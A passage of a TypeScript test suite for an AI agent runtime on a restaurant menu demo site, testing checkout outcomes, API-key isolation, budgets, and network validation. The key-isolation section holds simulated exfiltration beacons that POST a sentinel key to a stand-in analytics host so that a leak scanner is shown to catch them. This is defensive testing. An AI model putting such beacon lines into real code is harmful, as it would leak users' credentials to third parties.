    });
    const r = await broken.dispatch(scope, "reader", {}, null, "t");
    expect(r.receipts![0]!.status).toBe("failed");
  });

  test("the real checkout path succeeds and is verified by reading the page back", async () => {
    const { registry, scope } = bareRegistry();
    await registry.dispatch(scope, "add_to_cart", { item: "tomato_soup" }, async () => true, "t");
    const got = await registry.dispatch(scope, "checkout_demo_order", {}, async () => true, "t");
    expect(got.receipts![0]!.status).toBe("succeeded");
    expect(String((got.receipts![0]!.result as { summary: string }).summary)).toContain("Tomato soup");
    expect(document.querySelector("[data-confirmation]")!.hasAttribute("hidden")).toBe(false);
  });

  /**
   * `unknown` has to mean one thing to be worth anything. A committing action that
   * fails BEFORE it touches the page provably did nothing, so it reports `failed`,
   * and the "we don't know whether your order went through" banner stays down.
   * Breaks if `NoEffectError` stops being honoured, or if a handler throws it after
   * it has already clicked something.
   */
  test.each([
    ["an empty order", "checkout_demo_order", {}, "empty"],
    ["an item with no Add control on the page", "add_to_cart", { item: "reuben" }, "no Add control"],
  ])("a committing action that fails before it changes anything reports failed, not unknown: %s", async (_label, action, args, hint) => {
    document.documentElement.innerHTML = "<div></div>"; // no shop markup at all
    const { registry, scope } = bareRegistry();
    const got = await registry.dispatch(scope, action, args, async () => true, "t");
    expect(got.receipts![0]!.status).toBe("failed");
    expect(got.receipts![0]!.status).not.toBe("unknown");
    expect(got.receipts![0]!.error).toContain(hint);
  });

  test("the unknown-outcome banner uses the right wording for the action that was left in doubt", async () => {
    let calls = 0;
    const h = harness({ replies: [callTool("checkout_demo_order", {}), say("Passed on.")] });
    const s = await session({
      key: SENTINEL,
      h,
      checkoutTimeoutMs: 120,
      placeOrder: () => {
        calls += 1;
        return new Promise(() => {});
      },
    });
    await s.runtime.ask("order it");
    expect(calls).toBe(1);
    expect(s.$("[data-outcome-unknown]")!.textContent).toContain("The order was started");
  });
});

/* ================================================================== */
/* F. The visitor's key goes to the router and nowhere else            */
/* ================================================================== */

/**
 * Scan every surface the spec names: request URLs (query string included),
 * request bodies, request headers, the trace, and action arguments. Returns one
 * line per place the sentinel was found, so the assertion is an exact whitelist
 * rather than a count.
 */
async function leaks(captured: Captured[], trace: TraceEntry[], plans: ConfirmItem[][], sentinel: string): Promise<string[]> {
  const out: string[] = [];
  for (const c of captured) {
    if (c.url.includes(sentinel)) out.push(`url ${c.url}`);
    if (new URL(c.url).search.includes(sentinel)) out.push(`query ${c.url}`);
    // Read at SCAN time, off the normalised Request, so body KIND is irrelevant
    // (string, URLSearchParams, FormData, Blob, ReadableStream) and capture TIME
    // is irrelevant too.
    if ((await bodyOf(c)).includes(sentinel)) out.push(`body ${c.url}`);
    for (const [k, v] of c.request.headers) if (v.includes(sentinel)) out.push(`header ${k} ${c.url}`);
  }
  if (JSON.stringify(trace).includes(sentinel)) out.push("trace");
  if (JSON.stringify(plans).includes(sentinel)) out.push("confirm plan");
  // The set of PLACES, not the number of occurrences: several authorised calls to
  // the one router the visitor chose is the whole point, not a leak.
  return [...new Set(out)].sort();
}

describe("the visitor's key reaches the router they chose, and nothing else", () => {
  /**
   * The whitelist is exactly one entry. Breaks if the key appears anywhere else
   * at all: in a peer request, a public-artifact request, a URL, a prompt, an
   * action argument, a confirmation plan or a trace line.
   */
  test("across a whole session, the key appears in exactly one place: the router's Authorization header", async () => {
    const h = harness({
      replies: [callTool("check_safety", { restrictions: ["dairy_free"] }), callTool("add_to_cart", { item: "reuben" }), say("Done.")],
      peers: { "https://bakery.example/agents/agent-manifest.json": { networks: [{ name: "marrow_point", front_man: "baker", hocon: "x.json" }] } },
    });
    const s = await session({ key: SENTINEL, h, allowedPeers: ["https://bakery.example"] });
    s.tick("dairy_free");
    await s.runtime.ask("check the menu for me and add a reuben");
    await s.runtime.fetchPeerArtifact("https://bakery.example/agents/agent-manifest.json");

    // The session really did talk to several origins.
    expect(new Set(h.captured.map((c) => new URL(c.url).origin)).size).toBeGreaterThanOrEqual(3);
    expect(h.captured.filter((c) => c.url === ROUTER_URL).length).toBeGreaterThanOrEqual(2);

    expect(await leaks(h.captured, s.runtime.trace(), s.plans, SENTINEL)).toEqual([`header authorization ${ROUTER_URL}`]);
  });

  test("no prompt sent to the model contains the key", async () => {
    const h = harness({ replies: [callTool("get_menu_state", {}), say("Here is the menu.")] });
    const s = await session({ key: SENTINEL, h });
    await s.runtime.ask("what have you got?");
    const prompts = (await h.routerBodies()).flatMap((b) => b.messages.map((m) => m.content));
    expect(prompts.length).toBeGreaterThan(2);
    for (const p of prompts) expect(p).not.toContain(SENTINEL);
    // It really was used: the request that carried those prompts was authorised.
    expect(h.captured.find((c) => c.url === ROUTER_URL)!.request.headers.get("authorization")).toBe(`Bearer ${SENTINEL}`);
  });

  test("the trace records that a key was used, never its value", async () => {
    const h = harness({ replies: [say("Hello.")] });
    const s = await session({ key: SENTINEL, h });
    await s.runtime.ask("hello");
    const t = s.runtime.trace();
    expect(t.some((e) => e.detail["keySource"] === "local BYOK (not shown)")).toBe(true);
    expect(JSON.stringify(t)).not.toContain(SENTINEL);
  });

  /** Every body shape a real beacon might use. Fire-and-forget is the realistic form. */
  const beaconBodies = (): { name: string; body: BodyInit }[] => [
    { name: "string", body: `{"k":"${SENTINEL}"}` },
    { name: "URLSearchParams", body: new URLSearchParams({ k: SENTINEL }) },
    { name: "FormData", body: (() => { const f = new FormData(); f.append("k", SENTINEL); return f; })() },
    { name: "Blob", body: new Blob([`k=${SENTINEL}`], { type: "text/plain" }) },
    {
      name: "ReadableStream",
      body: new ReadableStream({
        start(c) {
          c.enqueue(new TextEncoder().encode(`k=${SENTINEL}`));
          c.close();
        },
      }),
    },
  ];

  /** The scanner has to be able to fail, or the test above proves nothing. */
  test("the scanner is live: a key in a URL, a query, another header or the trace all trip it", async () => {
    // Built exactly the way `harness` builds a capture, so the liveness test
    // cannot drift away from the thing it is testing.
    const fake = (url: string, init: RequestInit = {}): Captured => ({ url, init, request: captureRequest(url, init) });
    expect(await leaks([fake(`https://x.example/${SENTINEL}`)], [], [], SENTINEL)).toEqual([`url https://x.example/${SENTINEL}`]);
    expect(await leaks([fake(`https://x.example/a?key=${SENTINEL}`)], [], [], SENTINEL)).toHaveLength(2); // url and query
    expect(await leaks([fake("https://x.example/a", { headers: { "X-Api-Key": SENTINEL } })], [], [], SENTINEL)).toEqual([
      "header x-api-key https://x.example/a",
    ]);
    expect(await leaks([], [{ at: 0, event: "oops", detail: { key: SENTINEL } }], [], SENTINEL)).toEqual(["trace"]);
    expect(await leaks([], [], [[{ action: "a", description: "d", origin: "o", effect: "read", arguments: { k: SENTINEL } }]], SENTINEL)).toEqual([
      "confirm plan",
    ]);
    expect(await leaks([fake("https://x.example/a")], [{ at: 0, event: "fine", detail: {} }], [], SENTINEL)).toEqual([]);
  });

  /**
   * THE RACE, pinned.
   *
   * An exfiltration beacon is fire-and-forget: nobody awaits it. The previous
   * harness read the body with an `await` BEFORE pushing the capture, so such a
   * request reached `captured` only after the assertions had run — and because a
   * Blob takes more microtasks to read than a URLSearchParams, the string and
   * URLSearchParams beacons were caught while the Blob beacon passed 237/237. The
   * key-isolation check was reported closed and was not.
   *
   * The first assertion is SYNCHRONOUS on purpose: it runs in the same tick as the
   * unawaited call, so no amount of microtask timing can make it pass if the
   * capture is behind an await again.
   */
  test.each(beaconBodies())("a fire-and-forget beacon with a $name body is captured and scanned", async ({ body }) => {
    const h = harness({});
    void h.fetchImpl("https://analytics.example/collect", { method: "POST", body }); // deliberately not awaited
    expect(h.captured, "the capture must not sit behind an await").toHaveLength(1);
    expect(await leaks(h.captured, [], [], SENTINEL)).toEqual(["body https://analytics.example/collect"]);
  });

  test.each(beaconBodies())("an awaited beacon with a $name body is caught too", async ({ body }) => {
    const h = harness({});
    await h.fetchImpl("https://analytics.example/collect", { method: "POST", body }).catch(() => undefined);
    expect(await leaks(h.captured, [], [], SENTINEL)).toEqual(["body https://analytics.example/collect"]);
  });

  test("a fire-and-forget request with no key in it is not reported", async () => {
    const h = harness({});
    void h.fetchImpl("https://analytics.example/collect", { method: "POST", body: new Blob(["nothing here"]) });
    expect(h.captured).toHaveLength(1);
    expect(await leaks(h.captured, [], [], SENTINEL)).toEqual([]);
  });

  /**
   * Public artifact requests carry no ambient credential (L322-324). Asserted on
   * the normalised `Request`, not on the init object we handed to fetch.
   */
  test("the manifest, the network definition and links.json are fetched with no credentials", async () => {
    const h = harness({ replies: [] });
    await session({ key: SENTINEL, h });
    const wanted = [`${BASE}/agent-manifest.json`, `${BASE}/vouch.network.json`, `${BASE}/links.json`];
    for (const url of wanted) {
      const c = h.captured.find((x) => x.url === url);
      expect(c, url).toBeDefined();
      expect(c!.request.credentials, url).toBe("omit");
      expect(c!.request.headers.get("authorization"), url).toBeNull();
      expect(c!.request.headers.get("cookie"), url).toBeNull();
    }
  });

  test("a peer's public artifact is fetched the same way, with no key and no credentials", async () => {
    const peerUrl = "https://bakery.example/agents/agent-manifest.json";
    const h = harness({ peers: { [peerUrl]: { networks: [] } } });
    const s = await session({ key: SENTINEL, h, allowedPeers: ["https://bakery.example"] });
    await s.runtime.fetchPeerArtifact(peerUrl);
    const c = h.captured.find((x) => x.url === peerUrl)!;
    expect(c.request.credentials).toBe("omit");
    expect(c.request.headers.get("authorization")).toBeNull();
    expect(await leaks([c], [], [], SENTINEL)).toEqual([]);
  });

  /** A denied origin is refused and named, and nothing goes out. */
  test("an origin outside the published peer policy is refused by name and never contacted", async () => {
    const h = harness();
    const s = await session({ key: SENTINEL, h });
    const before = h.captured.length;
    await expect(s.runtime.fetchPeerArtifact("https://someone-else.example/agents/x")).rejects.toThrow(
      /https:\/\/someone-else\.example is not an allowed peer/,
    );
    expect(h.captured).toHaveLength(before);
    expect(s.runtime.trace().some((e) => e.event === "peer_refused")).toBe(true);
  });
});

/* ================================================================== */
/* G. The visitor can take their key back                             */
/* ================================================================== */

describe("the stored key can be deleted, and the safety layer does not care", () => {
  /** Asserted on the store, not on the call. */
  test("the delete affordance leaves the store actually empty", async () => {
    const s = await session({ key: SENTINEL });
    expect(s.storage.map.size).toBe(1);
    expect(s.runtime.keyStore.key()).toBe(SENTINEL);
    s.$("[data-key-forget]")!.click();
    expect(s.storage.map.size).toBe(0);
    expect(s.storage.getItem(KEY_ITEM)).toBeNull();
    expect(s.runtime.keyStore.key()).toBe("");
    expect(s.$("[data-key-input]") as HTMLInputElement).toHaveProperty("value", "");
    expect(s.$("[data-key-status]")!.textContent).toContain("deleted");
  });

  test("after deleting the key, the verdict beside every dish still works", async () => {
    const s = await session({ key: SENTINEL });
    s.$("[data-key-forget]")!.click();
    s.tick("dairy_free");
    expect(document.querySelectorAll("[data-verdict-slot] [data-verdict]")).toHaveLength(MENU.items.length);
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
    expect(s.$("[data-key-status]")!.textContent).toContain("never needed a model");
  });

  test("saving a key keeps it here, and reading it back returns it unchanged", async () => {
    const s = await session();
    (s.$("[data-key-input]") as HTMLInputElement).value = SENTINEL;
    s.$("[data-key-save]")!.click();
    expect(new KeyStore(s.storage).key()).toBe(SENTINEL);
  });

  test("a browser that refuses storage is reported, not crashed into", () => {
    const hostile: StorageLike = {
      getItem: () => {
        throw new Error("blocked");
      },
      setItem: () => {
        throw new Error("blocked");
      },
      removeItem: () => {
        throw new Error("blocked");
      },
    };
    const store = new KeyStore(hostile);
    expect(store.read()).toBeNull();
    expect(store.key()).toBe("");
    expect(store.save({ key: SENTINEL })).toBe(false);
    expect(() => store.forget()).not.toThrow();
  });

  test("a corrupt stored profile is ignored rather than trusted", () => {
    const s = new MemStorage();
    for (const junk of ["", "not json", "[]", '{"key":""}', '{"router":"x"}', "null"]) {
      s.setItem(KEY_ITEM, junk);
      expect(new KeyStore(s).read(), junk).toBeNull();
    }
  });

  test("with no key at all, asking says what to do and does not call a model", async () => {
    const h = harness({ replies: [] });
    const s = await session({ h });
    await s.runtime.ask("what can I eat?");
    expect(h.captured.filter((c) => c.url === ROUTER_URL)).toHaveLength(0);
    const t = s.transcriptText();
    expect(t).toContain("api.openai.com");
    expect(t).toContain("stays in this browser");
    // The sentence only this product can add.
    expect(t).toContain("never calls a model");
  });
});

/* ================================================================== */
/* H. Bounded execution, and failing closed                           */
/* ================================================================== */

describe("execution is bounded and failures are visible", () => {
  test("an over-budget conversation stops with the budget shown, and nothing half-done", async () => {
    const h = harness({ replies: [callTool("get_menu_state", {}), callTool("get_menu_state", {}), say("never reached")] });
    const s = await session({ key: SENTINEL, h, limits: { maxModelCalls: 1 } });
    await s.runtime.ask("tell me everything");
    expect(s.transcriptText()).toContain("maxModelCalls is 1");
    expect(h.captured.filter((c) => c.url === ROUTER_URL)).toHaveLength(1);
    expect(s.runtime.trace().some((e) => e.event === "budget_stopped")).toBe(true);
  });

  /**
   * I5: the per-turn budget resets. Breaks if `send` stops zeroing `modelCalls`:
   * with a limit of 2, the third plain question used to print "Execution limit
   * reached" and the assistant never recovered.
   */
  test("a plain question costs one call and the budget starts fresh every turn", async () => {
    const h = harness({ replies: [say("One."), say("Two."), say("Three."), say("Four.")] });
    const s = await session({ key: SENTINEL, h, limits: { maxModelCalls: 2 } });
    for (const q of ["a", "b", "c", "d"]) await s.runtime.ask(q);
    expect(s.transcriptText()).not.toContain("Execution limit reached");
    expect(h.captured.filter((c) => c.url === ROUTER_URL)).toHaveLength(4);
    expect(s.runtime.conversation!.usage().modelCalls).toBe(1); // this turn, not the session
    expect(s.runtime.conversation!.usage().sessionModelCalls).toBe(4);
  });

  test("the session backstop stops the run and says how to carry on", async () => {
    const h = harness({ replies: [say("One."), say("Two."), say("Three.")] });
    const s = await session({ key: SENTINEL, h, limits: { maxSessionModelCalls: 2 } });
    await s.runtime.ask("a");
    await s.runtime.ask("b");
    await s.runtime.ask("c");
    expect(s.transcriptText()).toContain("maxSessionModelCalls is 2");
    expect(s.transcriptText()).toContain("Start a new conversation");
    expect(h.captured.filter((c) => c.url === ROUTER_URL)).toHaveLength(2);
  });

  test("the new-conversation control gives the budget back and leaves the cards alone", async () => {
    const h = harness({ replies: [say("One."), say("Two."), say("Three.")] });
    const s = await session({ key: SENTINEL, h, limits: { maxSessionModelCalls: 1 } });
    s.tick("dairy_free");
    const cards = slotsText();
    await s.runtime.ask("a");
    await s.runtime.ask("b");
    expect(s.transcriptText()).toContain("maxSessionModelCalls");
    s.$("[data-new-conversation]")!.click();
    await s.runtime.ask("c");
    expect(s.transcriptText()).toContain("Two."); // a fresh conversation really did run
    expect(slotsText()).toEqual(cards);
  });

  /** The two always-true sentences are page chrome, not something a model says per turn. */
  test("the standing note is on the page from the start and is not model output", async () => {
    const s = await session({ h: harness({ artifactError: true }) });
    const note = s.$("[data-standing-note]")!;
    expect(note).not.toBeNull();
    expect(note.textContent).toContain("does not decide whether food is safe");
    expect(note.textContent).toContain("verdict beside each dish");
    expect(s.$$("[data-turn]")).toHaveLength(0); // nothing has been said by anyone yet
  });

  test("an invalid published network is stopped with the validation errors on screen", async () => {
    const broken = structuredClone(NETWORK);
    broken.tools![0]!.tools = ["menu_guide", "a_tool_that_does_not_exist"];
    broken.tools!.push(structuredClone(broken.tools![1]!)); // a duplicate name too
    const s = await session({ h: harness({ artifacts: { [`${BASE}/vouch.network.json`]: broken } }) });
    const shown = s.$("[data-runtime-error]")!.textContent!;
    expect(shown).toContain("a_tool_that_does_not_exist");
    expect(shown).toContain("Duplicate agent name 'menu_guide'");
    expect(s.runtime.conversation).toBeNull();
    s.tick("dairy_free");
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  test("a network name that is not published is refused, never swapped for another", async () => {
    const s = await session({ network: "marrow_point" });
    expect(s.$("[data-runtime-error]")!.textContent).toContain("refusing to run a different one");
    expect(s.runtime.network).toBeNull();
  });

  test("a manifest front_man that disagrees with the positional rule is refused", async () => {
    const bent = structuredClone(MANIFEST);
    bent.networks![0]!.front_man = "menu_guide";
    const s = await session({ h: harness({ artifacts: { [`${BASE}/agent-manifest.json`]: bent } }) });
    expect(s.$("[data-runtime-error]")!.textContent).toContain("must agree");
    expect(s.runtime.conversation).toBeNull();
  });

  /** A true cycle is refused; a repeated sibling call is not a cycle (§3.1). */
  test("an agent appearing in its own ancestry is refused by name, and the call is not made", async () => {
    const cyclic: NetworkConfig = {
      metadata: { name: "loop", front_man: "a" },
      llm_config: { model_name: "test-model" },
      tools: [
        { name: "a", function: { description: "Front.", parameters: { type: "object", properties: { q: { type: "string", description: "q" } }, required: ["q"] } }, instructions: "You are A. Never say a dish is safe; the verdict is the site's.", tools: ["b"] },
        { name: "b", function: { description: "Second.", parameters: { type: "object", properties: { q: { type: "string", description: "q" } }, required: ["q"] } }, instructions: "You are B. Never say a dish is safe; the verdict is the site's.", tools: ["a"] },
      ],
    };
    const manifest = structuredClone(MANIFEST);
    manifest.networks = [{ name: "loop", front_man: "a", hocon: "loop.network.json" }];
    const h = harness({
      replies: [callTool("b", { q: "x" }), callTool("a", { q: "x" }), say("b is finished"), say("and so is a")],
      artifacts: { [`${BASE}/agent-manifest.json`]: manifest, [`${BASE}/loop.network.json`]: cyclic },
    });
    const s = await session({ key: SENTINEL, h });
    expect(s.runtime.conversation).not.toBeNull();
    await s.runtime.ask("go");
    expect(s.runtime.trace().some((e) => e.event === "cycle_refused")).toBe(true);
    const toolResults = (await h.routerBodies()).flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content));
    expect(toolResults.some((c) => c.includes("Composition cycle refused: a → b → a"))).toBe(true);
  });

  test("a tool call the network does not have is reported as a failure, not as a result", async () => {
    const h = harness({ replies: [callTool("sommelier", { q: "x" }), say("That is not something I can do.")] });
    const s = await session({ key: SENTINEL, h });
    await s.runtime.ask("ask the sommelier");
    const toolResults = (await h.routerBodies()).flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content));
    expect(toolResults[0]).toContain("FAILED");
    expect(toolResults[0]).toContain("not an agent in this network");
  });

  test("arguments that are not valid JSON stop the call rather than reaching a handler", async () => {
    const bad: ModelJson = {
      model: "test-model",
      choices: [{ message: { content: "", tool_calls: [{ id: "c", type: "function", function: { name: "add_to_cart", arguments: "{oops" } }] } }],
    };
    const h = harness({ replies: [bad, say("I could not do that.")] });
    const s = await session({ key: SENTINEL, h });
    await s.runtime.ask("add something");
    expect(s.plans).toHaveLength(0);
    expect(document.querySelectorAll("[data-cart-line]")).toHaveLength(0);
  });
});

/* ================================================================== */
/* I. The adapted upstream plumbing, against the real artifacts        */
/* ================================================================== */

describe("the adapted upstream plumbing, run against what we actually publish", () => {
  /** The positional rule, not metadata.front_man, is what decides. */
  test("the front agent of the published network is front_of_house, by the positional rule", () => {
    expect(find_front_man(NETWORK)).toBe("front_of_house");
    expect(NETWORK.metadata!.front_man).toBe("front_of_house");
    const reordered = structuredClone(NETWORK);
    reordered.tools = [reordered.tools![1]!, reordered.tools![0]!, ...reordered.tools!.slice(2)];
    // Metadata is unchanged and is ignored: order is what the rule reads.
    expect(reordered.metadata!.front_man).toBe("front_of_house");
    expect(find_front_man(reordered)).toBe("menu_guide");
  });

  test("the published network validates, and each kind of defect is caught", () => {
    expect(validate_network(NETWORK)).toEqual([]);
    // Upstream's validator concatenates every check rather than stopping at the
    // first, so an empty network reports both its defects. Matched deliberately.
    expect(validate_network({ tools: [] })).toEqual(["Network 'tools' array must not be empty.", "No front-man agent found."]);
    expect(validate_network({})).toEqual(["Network must have a 'tools' array.", "No front-man agent found."]);
    const dangling = structuredClone(NETWORK);
    dangling.tools![0]!.tools = ["nobody"];
    expect(validate_network(dangling)).toEqual(["Agent 'front_of_house' references missing tool 'nobody'."]);
    const dupe = structuredClone(NETWORK);
    dupe.tools!.push(structuredClone(dupe.tools![1]!));
    expect(validate_network(dupe)).toEqual(["Duplicate agent name 'menu_guide'."]);
  });

  test("every tool reference in the published network classifies as an in-network agent", () => {
    for (const agent of NETWORK.tools ?? []) {
      for (const ref of agent.tools ?? []) expect(classify_tool(NETWORK, ref), `${agent.name} -> ${String(ref)}`).toBe("agent");
    }
  });

  test("the published router rule: no key gives the default route, a key gives the BYOK route", () => {
    expect(selectTopRouter(MANIFEST, "", "")).toEqual({ baseUrl: ROUTER, mock: false, upgradedToByok: false });
    expect(selectTopRouter(MANIFEST, "", SENTINEL)).toEqual({ baseUrl: ROUTER, mock: false, upgradedToByok: true });
    // The defect Task 5 found, pinned once more at the function that found it.
    const nested = structuredClone(MANIFEST);
    delete nested.llm_router!["byok_router"];
    expect(() => selectTopRouter(nested, "", SENTINEL)).toThrow(/publishes no AI provider route/);
  });

  test("the replayed route is chosen as an override and never upgraded away", () => {
    expect(selectTopRouter(MANIFEST, SCRIPTED_ROUTER, "")).toEqual({ baseUrl: SCRIPTED_ROUTER, mock: false, upgradedToByok: false });
    expect(selectTopRouter(MANIFEST, SCRIPTED_ROUTER, SENTINEL).baseUrl).toBe(SCRIPTED_ROUTER);
  });

  test("the published peer policy admits nothing by default, and is not an open policy", () => {
    expect(manifestAllowsPeer("https://bakery.example/agents/x", MANIFEST)).toBe(false);
    expect(manifestAllowsPeer("https://bakery.example/agents/x", MANIFEST, new Set(["https://bakery.example"]))).toBe(true);
    const open = structuredClone(MANIFEST);
    open.peer_policy = { mode: "open", deny_origins: [] };
    expect(manifestAllowsPeer("https://anyone.example/x", open)).toBe(true);
    expect(manifestAllowsPeer("https://anyone.example/x", MANIFEST)).toBe(false);
  });

  /**
   * Our allow lists are all `[]`, so nothing crosses. This does NOT isolate
   * private context between sibling agents, and nothing here may claim it does.
   */
  test("private context is deny-by-default and our published allow lists pass nothing", () => {
    for (const agent of NETWORK.tools ?? []) {
      expect(filter_sly_data({ user_key: "x", session: "y" }, agent.allow?.to_downstream?.sly_data), agent.name).toEqual({});
      expect(filter_sly_data({ user_key: "x" }, agent.allow?.to_upstream?.sly_data), agent.name).toEqual({});
    }
    // The filter is live: a named field does cross, and a star crosses everything.
    expect(filter_sly_data({ a: 1, b: 2 }, ["a"])).toEqual({ a: 1 });
    expect(filter_sly_data({ a: 1, b: 2 }, ["*"])).toEqual({ a: 1, b: 2 });
    expect(filter_sly_data({ a: 1 }, null)).toEqual({});
  });

  test("links.json is read for the running network, and a missing one is not a failure", async () => {
    const h = harness();
    const s = await session({ h });
    expect(h.captured.some((c) => c.url === `${BASE}/links.json`)).toBe(true);
    expect(s.runtime.links()).toEqual({});
    const none = harness({ artifacts: { [`${BASE}/links.json`]: undefined } });
    expect(await loadPublishedLinks(BASE, "vouch", none.fetchImpl)).toEqual({});
  });

  test("the agent network cannot reach a verdict: no agent's tools name a registered action", () => {
    const actionNames = (MANIFEST.actions ?? []).map((a) => a.name);
    for (const agent of NETWORK.tools ?? []) {
      for (const ref of agent.tools ?? []) expect(actionNames).not.toContain(ref);
    }
  });
});
